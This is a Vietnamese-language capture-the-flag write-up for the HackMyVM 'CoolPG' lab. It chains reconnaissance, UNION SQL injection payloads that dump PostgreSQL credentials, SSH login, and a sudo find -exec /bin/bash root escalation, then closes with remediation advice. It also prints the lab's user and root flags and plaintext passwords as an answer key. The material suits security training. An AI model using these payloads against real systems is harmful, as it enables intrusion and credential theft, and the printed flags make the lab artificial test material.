# HackMyVM — CoolPG

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy CoolPG (Target) | `10.0.2.8` |
| Hostname | `coolpgi.hmv` |
| SSH | `22/tcp` — OpenSSH 10.0p2 Debian 7 |
| HTTP | `80/tcp` — nginx |
| Web title | `CoolPG Internal` |
| Web endpoint | `/panel`, `/search`, `/login` |
| DBMS | PostgreSQL |
| SQLi parameter | `q` |
| SSH user | `cool` |
| SSH password | `ThisIsMyPGMyAdmin` |

> **Quy ước 2 terminal**
>
> - 🟦 **Terminal Kali**: reconnaissance, Nmap, Gobuster, HTTP testing, SQL Injection và SSH client.
> - 🟥 **Terminal CoolPG**: các lệnh sau khi SSH vào máy đích, kiểm tra user, sudo, script và root.
>
> **Không chạy nhầm lệnh giữa 2 máy.**

---

# 1. Câu 1 — Khảo sát hệ thống

**Thực hiện quá trình trinh sát và quét máy chủ để xác định IP, các cổng mạng đang mở, dịch vụ đang chạy và các endpoint web có thể hỗ trợ quá trình đánh giá bảo mật.**

## 1.1. Xác định IP máy Target

### 🟦 Kali

Quét các máy đang hoạt động trong mạng lab:

```bash
nmap -sn 10.0.2.0/24
```

Kết quả thực tế của bài lab xác nhận:

```text
10.0.2.8    Host is up
10.0.2.15   Host is up
```

Trong đó:

```text
10.0.2.8  → CoolPG
10.0.2.15 → Kali
```

Vì vậy đặt IP mục tiêu:

```bash
ip=10.0.2.8
```

Có thể kiểm tra trực tiếp:

```bash
ping -c 4 $ip
```

---

## 1.2. Quét toàn bộ cổng TCP

### 🟦 Kali

```bash
nmap -p- -Pn -T4 10.0.2.8
```

Kết quả thực tế:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Nmap ghi nhận:

```text
65533 closed tcp ports
```

Hai cổng TCP cần tập trung:

```text
22/tcp → SSH
80/tcp → HTTP
```

---

## 1.3. Nhận diện dịch vụ và phiên bản

### 🟦 Kali

```bash
nmap -sC -sV -p22,80 -Pn 10.0.2.8
```

Kết quả thực tế:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: CoolPG Internal
```

Thông tin này cho thấy:

```text
OS       → Linux/Debian
SSH      → OpenSSH 10.0p2
Web      → nginx
Web title → CoolPG Internal
```

---

# 2. Câu 2 — Khai thác dịch vụ Web và SQL Injection

**Tiến hành khảo sát ứng dụng web, tìm endpoint ẩn, xác định SQL Injection, khai thác PostgreSQL để thu được thông tin đăng nhập SSH, sau đó sử dụng SSH để truy cập máy đích.**

## 2.1. Kiểm tra trang Web chính

### 🟦 Kali

```bash
curl -i http://10.0.2.8/
```

Kết quả quan trọng:

```text
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html; charset=utf-8
Content-Length: 1323
```

Tiêu đề:

```text
CoolPG Internal
```

HTML chứa:

```html
<!-- onboarding: ask IT for access -->
```

Form đăng nhập:

```html
<form method="POST" action="/login">
```

với hai trường:

```text
username
password
```

---

## 2.2. Kiểm tra source HTML

### 🟦 Kali

Có thể lưu source:

```bash
curl -s http://10.0.2.8/ -o index.html
```

Đọc:

```bash
cat index.html
```

Hoặc tìm các từ khóa:

```bash
curl -s http://10.0.2.8/ | grep -Ein "comment|admin|panel|search|login"
```

**Lưu ý:** trang chủ không trực tiếp chứa `/panel` và `/search`; vì vậy cần tiếp tục directory enumeration.

---

## 2.3. Thiết lập hostname `coolpgi.hmv`

### 🟦 Kali

Bài lab sử dụng hostname:

```text
coolpgi.hmv
```

Thêm vào `/etc/hosts`:

```bash
echo "10.0.2.8 coolpgi.hmv" | sudo tee -a /etc/hosts
```

Kiểm tra:

```bash
getent hosts coolpgi.hmv
```

Kết quả:

```text
10.0.2.8    coolpgi.hmv
```

Kiểm tra Web bằng hostname:

```bash
curl -I http://coolpgi.hmv/
```

Kết quả thực tế:

```text
HTTP/1.1 200 OK
Server: nginx
```

> **Quan trọng:** từ bước này nên dùng `http://coolpgi.hmv/` để thống nhất với hostname của bài.

---

## 2.4. Directory enumeration bằng Gobuster

### 🟦 Kali

Kiểm tra wordlist:

```bash
ls -lh /usr/share/wordlists/dirb/common.txt
```

Kết quả thực tế:

```text
-rw-r--r-- 1 root root 36K ... /usr/share/wordlists/dirb/common.txt
```

> **Lưu ý:** không gõ trực tiếp:
>
> ```bash
> /usr/share/wordlists/dirb/common.txt
> ```
>
> Đây chỉ là **file wordlist**, không phải chương trình thực thi. Nếu chạy trực tiếp sẽ nhận:
>
> ```text
> zsh: permission denied
> ```
>
> Cách đúng là truyền file cho Gobuster bằng `-w`.

Chạy:

```bash
gobuster dir \
-u http://coolpgi.hmv/ \
-w /usr/share/wordlists/dirb/common.txt \
-x php,html,txt,json,bak \
-b 301,404
```

Kết quả thực tế:

```text
login   (Status: 302) [Size: 189] [--> /]
panel   (Status: 200) [Size: 1273]
search  (Status: 200) [Size: 944]
```

Ba endpoint quan trọng:

```text
/login
/panel
/search
```

Trong đó:

```text
/panel  → User Lookup
/search → endpoint xử lý truy vấn
```

---

## 2.5. Phân tích `/panel`

### 🟦 Kali

```bash
curl -i http://coolpgi.hmv/panel
```

Hoặc:

```bash
curl -s http://coolpgi.hmv/panel
```

HTML cho biết:

```text
User Lookup
Search users by username.
```

Đặc biệt có ghi chú:

```text
Dev note: UNION reporting is supported for ops audits.
```

Form:

```html
<form method="GET" action="/search">
```

và parameter:

```html
<input name="q">
```

Như vậy endpoint cần kiểm tra là:

```text
GET /search?q=...
```

---

## 2.6. Kiểm tra `/search`

### 🟦 Kali

```bash
curl -i "http://coolpgi.hmv/search?q=test"
```

Kết quả:

```text
Query: test
No results
```

Thử một giá trị khác:

```bash
curl -s "http://coolpgi.hmv/search?q=a"
```

Kết quả:

```text
No results
```

Parameter cần kiểm tra:

```text
q
```

---

## 2.7. Xác nhận UNION SQL Injection

### 🟦 Kali

Payload kiểm tra:

```text
a' UNION SELECT 'test'--
```

Dùng URL encoding:

```bash
curl -s "http://coolpgi.hmv/search?q=a%27%20UNION%20SELECT%20%27test%27--"
```

Kết quả thực tế:

```text
Query: a' UNION SELECT 'test'--

test
```

Như vậy xác nhận:

```text
/search?q=...
        ↓
UNION SQL Injection
        ↓
Có thể đưa dữ liệu do attacker kiểm soát vào kết quả
```

Đây là **UNION-based SQL Injection, single-column**.

> **Quan trọng:** kết quả `test` xuất hiện trong bảng chứng minh payload đã thực thi thành công. Không cần dùng SQLMap ở bài này nếu muốn bám sát chain thủ công của write-up.

---

# 3. Khai thác PostgreSQL qua SQL Injection

## 3.1. Xác định các bảng trong schema `public`

### 🟦 Kali

```bash
curl -s "http://coolpgi.hmv/search?q=a'+UNION+SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema='public'--"
```

Kết quả thực tế:

```text
secrets
users
```

Vậy database có hai bảng đáng chú ý:

```text
users
secrets
```

---

## 3.2. Liệt kê column của bảng `users`

### 🟦 Kali

```bash
curl -s "http://coolpgi.hmv/search?q=a'+UNION+SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='users'--"
```

Kết quả:

```text
id
password
username
```

Cấu trúc:

```text
users
├── id
├── username
└── password
```

---

## 3.3. Dump username/password

PostgreSQL hỗ trợ nối chuỗi bằng:

```text
||
```

Payload:

```sql
username || ':' || password
```

Thực hiện:

### 🟦 Kali

```bash
curl -s "http://coolpgi.hmv/search?q=a'+UNION+SELECT+username+||+':'++||+password+FROM+users--"
```

Kết quả thực tế:

```text
admin:S3cr3tAdm1nPw
cool:ThisIsMyPGMyAdmin
```

Credential quan trọng:

```text
Username: cool
Password: ThisIsMyPGMyAdmin
```

---

## 3.4. Liệt kê column của bảng `secrets`

### 🟦 Kali

```bash
curl -s "http://coolpgi.hmv/search?q=a'+UNION+SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='secrets'--"
```

Kết quả:

```text
id
name
value
```

Cấu trúc:

```text
secrets
├── id
├── name
└── value
```

---

## 3.5. Dump bảng `secrets`

### 🟦 Kali

```bash
curl -s "http://coolpgi.hmv/search?q=a'+UNION+SELECT+name+||+':'++||+value+FROM+secrets--"
```

Kết quả thực tế:

```text
ssh_user:cool
ssh_pass:ThisIsMyPGMyAdmin
```

Điều này xác nhận credential SSH:

```text
ssh_user = cool
ssh_pass = ThisIsMyPGMyAdmin
```

---

# 4. SSH vào CoolPG

## 4.1. SSH từ Kali

### 🟦 Kali

```bash
ssh cool@10.0.2.8
```

Khi SSH hỏi password:

```text
ThisIsMyPGMyAdmin
```

Lần đầu kết nối có thể xuất hiện:

```text
Are you sure you want to continue connecting (yes/no/[fingerprint])?
```

Nhập:

```text
yes
```

Sau khi đăng nhập thành công:

```text
cool@coolpgi:~$
```

---

## 4.2. Xác nhận tài khoản

### 🟥 CoolPG

```bash
whoami
```

Kết quả:

```text
cool
```

Kiểm tra UID/GID:

```bash
id
```

Kết quả thực tế:

```text
uid=1000(cool) gid=1000(cool) groups=1000(cool),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
```

Kiểm tra hostname:

```bash
hostname
```

Kết quả:

```text
coolpgi.hmv
```

Như vậy initial access thành công:

```text
SSH → cool@coolpgi.hmv
```

---

# 5. Câu 2 — Lấy User Flag

## 5.1. Kiểm tra thư mục home

### 🟥 CoolPG

```bash
ls -la
```

Kết quả thực tế có:

```text
-rw------- 1 cool cool 30 Jan  4  2026 user.txt
-rw-rw-r-- 1 root root  0 Jan  4  2026 debug.log
```

---

## 5.2. Tìm user flag

Có thể thử:

```bash
find /home/cool -type f -iname "*flag*" 2>/dev/null
```

Trong VM này lệnh không trả về vì file có tên:

```text
user.txt
```

Do đó đọc trực tiếp:

### 🟥 CoolPG

```bash
cat user.txt
```

Kết quả:

```text
HMV{coolpg_user_c947e9399834}
```

**User Flag:**

```text
HMV{coolpg_user_c947e9399834}
```

> **Lưu ý:** không dùng:
>
> ```bash
> cat /user.txt
> ```
>
> vì file nằm tại:
>
> ```text
> /home/cool/user.txt
> ```

Có thể dùng đường dẫn tuyệt đối:

```bash
cat /home/cool/user.txt
```

---

# 6. Kiểm tra quyền sudo

### 🟥 CoolPG

```bash
sudo -l
```

Kết quả thực tế:

```text
User cool may run the following commands on coolpgi:
    (ALL) NOPASSWD: /usr/local/bin/runlogs-find.sh
```

Điểm quan trọng:

```text
cool
  │
  └── sudo NOPASSWD
        │
        └── /usr/local/bin/runlogs-find.sh
```

Nghĩa là `cool` có thể chạy script này với quyền root mà không cần nhập mật khẩu.

---

# 7. Phân tích script leo quyền

## 7.1. Kiểm tra permission

### 🟥 CoolPG

```bash
ls -la /usr/local/bin/runlogs-find.sh
```

Kết quả:

```text
-rwxr-xr-x 1 root root 99 Jan  4  2026 /usr/local/bin/runlogs-find.sh
```

File thuộc:

```text
root:root
```

---

## 7.2. Đọc nội dung script

### 🟥 CoolPG

```bash
cat /usr/local/bin/runlogs-find.sh
```

Nội dung thực tế:

```bash
#!/bin/sh
exec /usr/bin/find /home/cool -maxdepth 3 -type f -name "*.log" -exec /bin/bash \; -quit
```

Phân tích:

```text
/usr/bin/find
        ↓
/home/cool
        ↓
tìm file *.log
        ↓
-exec /bin/bash \;
        ↓
mở Bash
```

Quan trọng nhất:

```text
sudo /usr/local/bin/runlogs-find.sh
```

làm cho toàn bộ script chạy với quyền root.

Khi `find` tìm thấy `.log`, nó thực hiện:

```text
/bin/bash
```

với quyền của tiến trình root.

---

# 8. Kiểm tra file `.log`

### 🟥 CoolPG

```bash
find /home/cool -maxdepth 3 -type f -name "*.log" -ls
```

Kết quả thực tế:

```text
/home/cool/debug.log
```

Thông tin:

```text
root root
```

Như vậy điều kiện của script đã được thỏa mãn:

```text
/home/cool/debug.log
        ↓
find tìm thấy *.log
        ↓
-exec /bin/bash
```

---

# 9. Leo thang lên Root

### 🟥 CoolPG

**Đây là lệnh khai thác chính xác đã thành công trên VM:**

```bash
sudo /usr/local/bin/runlogs-find.sh
```

Sau khi chạy, prompt chuyển thành:

```text
root@coolpgi:/home/cool#
```

Kiểm tra:

```bash
whoami
```

Kết quả:

```text
root
```

Kiểm tra UID:

```bash
id
```

Kết quả:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Như vậy privilege escalation:

```text
cool
 ↓
sudo NOPASSWD
 ↓
runlogs-find.sh
 ↓
find
 ↓
-exec /bin/bash
 ↓
root
```

> ⚠️ **Lỗi cần tránh:** không tự gõ lại dòng `exec /usr/bin/find ... -exec /bin/bash ; -quit` mà bỏ mất `\;`.
>
> Khi bỏ `\;`, `find` báo:
>
> ```text
> /usr/bin/find: missing argument to `-exec'
> ```
>
> và phiên SSH có thể bị đóng.
>
> **Không cần sửa script. Chỉ cần chạy đúng:**
>
> ```bash
> sudo /usr/local/bin/runlogs-find.sh
> ```

---

# 10. Lấy Root Flag

## 10.1. Chuyển vào `/root`

### 🟥 Root trên CoolPG

```bash
cd /root
```

Kiểm tra:

```bash
ls -la
```

Kết quả thực tế có:

```text
-rw------- 1 root root 30 Jan  4  2026 root.txt
```

---

## 10.2. Đọc Root Flag

### 🟥 Root

```bash
cat /root/root.txt
```

Kết quả:

```text
HMV{coolpg_root_de6eac329255}
```

**Root Flag:**

```text
HMV{coolpg_root_de6eac329255}
```

---

# 11. Chuỗi khai thác hoàn chỉnh

```text
┌────────────────────────────┐
│ 🟦 KALI                    │
│ 10.0.2.15                  │
└─────────────┬──────────────┘
              │
              │ Nmap
              ▼
┌────────────────────────────┐
│ 🟥 COOLPG                  │
│ 10.0.2.8                   │
│                            │
│ 22/tcp → SSH               │
│ 80/tcp → nginx             │
└─────────────┬──────────────┘
              │
              │ HTTP
              ▼
┌────────────────────────────┐
│ coolpgi.hmv                │
│                            │
│ /panel                     │
│ /search?q=                 │
└─────────────┬──────────────┘
              │
              │ UNION SQL Injection
              ▼
┌────────────────────────────┐
│ PostgreSQL                 │
│                            │
│ users                      │
│ ├── username               │
│ └── password               │
│                            │
│ secrets                    │
│ ├── ssh_user               │
│ └── ssh_pass               │
└─────────────┬──────────────┘
              │
              │ cool / ThisIsMyPGMyAdmin
              ▼
┌────────────────────────────┐
│ SSH                        │
│ cool@coolpgi.hmv           │
│                            │
│ /home/cool/user.txt        │
└─────────────┬──────────────┘
              │
              │ sudo -l
              ▼
┌────────────────────────────┐
│ NOPASSWD                   │
│ /usr/local/bin/            │
│ runlogs-find.sh             │
└─────────────┬──────────────┘
              │
              │ find *.log
              ▼
┌────────────────────────────┐
│ -exec /bin/bash \;         │
└─────────────┬──────────────┘
              │
              ▼
┌────────────────────────────┐
│ ROOT                       │
│ uid=0(root)                │
│                            │
│ /root/root.txt             │
└────────────────────────────┘
```

---

# 12. Toàn bộ quy trình — Copy/Paste theo đúng thứ tự

Phần này dùng để **làm lại bài từ đầu**.

## 🟦 TERMINAL KALI — Reconnaissance

```bash
nmap -sn 10.0.2.0/24
```

```bash
nmap -p- -Pn -T4 10.0.2.8
```

```bash
nmap -sC -sV -p22,80 -Pn 10.0.2.8
```

---

## 🟦 TERMINAL KALI — Web

```bash
curl -i http://10.0.2.8/
```

```bash
curl -s http://10.0.2.8/ -o index.html
```

```bash
cat index.html
```

Thêm hostname:

```bash
echo "10.0.2.8 coolpgi.hmv" | sudo tee -a /etc/hosts
```

Kiểm tra:

```bash
getent hosts coolpgi.hmv
```

---

## 🟦 TERMINAL KALI — Gobuster

```bash
ls -lh /usr/share/wordlists/dirb/common.txt
```

```bash
gobuster dir \
-u http://coolpgi.hmv/ \
-w /usr/share/wordlists/dirb/common.txt \
-x php,html,txt,json,bak \
-b 301,404
```

Cần thấy:

```text
/login
/panel
/search
```

---

## 🟦 TERMINAL KALI — SQL Injection

Kiểm tra:

```bash
curl -i "http://coolpgi.hmv/search?q=test"
```

Test UNION:

```bash
curl -s "http://coolpgi.hmv/search?q=a%27%20UNION%20SELECT%20%27test%27--"
```

Liệt kê bảng:

```bash
curl -s "http://coolpgi.hmv/search?q=a'+UNION+SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema='public'--"
```

Liệt kê column `users`:

```bash
curl -s "http://coolpgi.hmv/search?q=a'+UNION+SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='users'--"
```

Dump credential:

```bash
curl -s "http://coolpgi.hmv/search?q=a'+UNION+SELECT+username+||+':'++||+password+FROM+users--"
```

Liệt kê column `secrets`:

```bash
curl -s "http://coolpgi.hmv/search?q=a'+UNION+SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='secrets'--"
```

Dump secrets:

```bash
curl -s "http://coolpgi.hmv/search?q=a'+UNION+SELECT+name+||+':'++||+value+FROM+secrets--"
```

Credential:

```text
cool
ThisIsMyPGMyAdmin
```

---

## 🟦 TERMINAL KALI — SSH

```bash
ssh cool@10.0.2.8
```

Password:

```text
ThisIsMyPGMyAdmin
```

---

## 🟥 TERMINAL COOLPG — Initial Access

```bash
whoami
```

```bash
id
```

```bash
hostname
```

Đọc User Flag:

```bash
cat /home/cool/user.txt
```

Kết quả:

```text
HMV{coolpg_user_c947e9399834}
```

---

## 🟥 TERMINAL COOLPG — Privilege Escalation

```bash
sudo -l
```

Kiểm tra script:

```bash
ls -la /usr/local/bin/runlogs-find.sh
```

```bash
cat /usr/local/bin/runlogs-find.sh
```

Kiểm tra `.log`:

```bash
find /home/cool -maxdepth 3 -type f -name "*.log" -ls
```

Leo quyền:

```bash
sudo /usr/local/bin/runlogs-find.sh
```

Xác nhận:

```bash
whoami
```

```bash
id
```

Phải có:

```text
root
uid=0(root)
```

---

## 🟥 TERMINAL ROOT — Root Flag

```bash
cd /root
```

```bash
ls -la
```

```bash
cat /root/root.txt
```

Kết quả:

```text
HMV{coolpg_root_de6eac329255}
```

---

# 13. Câu 3 — Phân tích nguyên nhân và biện pháp khắc phục

## 13.1. SQL Injection

Ứng dụng `/search` đưa trực tiếp parameter:

```text
q
```

vào truy vấn SQL mà không kiểm soát đúng cách.

Payload:

```text
a' UNION SELECT 'test'--
```

được ứng dụng thực thi và phản hồi dữ liệu.

### Khắc phục

- Sử dụng parameterized queries / prepared statements.
- Không nối chuỗi input trực tiếp vào SQL.
- Validate input theo kiểu dữ liệu và ngữ cảnh.
- Database account của Web chỉ có quyền tối thiểu cần thiết.
- Không để tài khoản ứng dụng có quyền quản trị database.

---

## 13.2. Lộ credential trong database

Bảng:

```text
users
```

chứa:

```text
username
password
```

và SQL Injection cho phép đọc toàn bộ dữ liệu.

### Khắc phục

- Không lưu password dạng plaintext.
- Sử dụng password hashing hiện đại như Argon2id hoặc bcrypt.
- Dùng secret management thay vì hard-code credential.
- Rotate credential sau khi có dấu hiệu lộ thông tin.
- Hạn chế quyền đọc của database account.

---

## 13.3. Sudo NOPASSWD cho script nguy hiểm

User:

```text
cool
```

được phép:

```text
sudo /usr/local/bin/runlogs-find.sh
```

với:

```text
NOPASSWD
```

Trong khi script thực hiện:

```bash
find ... -exec /bin/bash \;
```

Điều này tạo trực tiếp đường dẫn tới root shell.

### Khắc phục

- Không cấp `sudo` cho script có khả năng thực thi shell.
- Không sử dụng `find -exec` với interpreter nếu script không thực sự cần.
- Hạn chế sudoers theo đúng chức năng.
- Không dùng `NOPASSWD` nếu không cần thiết.
- Review toàn bộ script được phép chạy bằng root.

---

# 14. Checklist hoàn thành bài CoolPG

| STT | Nội dung | Trạng thái |
|---:|---|:---:|
| 1 | Xác định CoolPG `10.0.2.8` | ✅ |
| 2 | TCP scan | ✅ |
| 3 | Xác định SSH | ✅ |
| 4 | Xác định nginx | ✅ |
| 5 | Thiết lập `coolpgi.hmv` | ✅ |
| 6 | Gobuster | ✅ |
| 7 | Phát hiện `/panel` | ✅ |
| 8 | Phát hiện `/search` | ✅ |
| 9 | Xác nhận UNION SQLi | ✅ |
| 10 | Liệt kê `users`, `secrets` | ✅ |
| 11 | Dump credential | ✅ |
| 12 | SSH user `cool` | ✅ |
| 13 | Lấy `user.txt` | ✅ |
| 14 | `sudo -l` | ✅ |
| 15 | Phân tích `runlogs-find.sh` | ✅ |
| 16 | Leo lên root | ✅ |
| 17 | Lấy `root.txt` | ✅ |

---

# 15. Đáp án cuối bài

## User Flag

```text
HMV{coolpg_user_c947e9399834}
```

## Root Flag

```text
HMV{coolpg_root_de6eac329255}
```

## Credential SSH

```text
Username: cool
Password: ThisIsMyPGMyAdmin
```

## Privilege Escalation

```text
sudo NOPASSWD
        ↓
/usr/local/bin/runlogs-find.sh
        ↓
find -exec /bin/bash \;
        ↓
root
```

---

# Kết luận

Chuỗi khai thác của CoolPG có thể tóm tắt:

```text
Nmap
 ↓
10.0.2.8
 ↓
80/tcp nginx
 ↓
coolpgi.hmv
 ↓
Gobuster
 ↓
/panel + /search
 ↓
UNION SQL Injection
 ↓
PostgreSQL
 ↓
users / secrets
 ↓
cool : ThisIsMyPGMyAdmin
 ↓
SSH
 ↓
cool
 ↓
user.txt
 ↓
sudo -l
 ↓
runlogs-find.sh
 ↓
find -exec /bin/bash
 ↓
root
 ↓
root.txt
```

**Hai flag đã được xác nhận trực tiếp trên VM của bài lab:**

```text
USER: HMV{coolpg_user_c947e9399834}
ROOT: HMV{coolpg_root_de6eac329255}
```
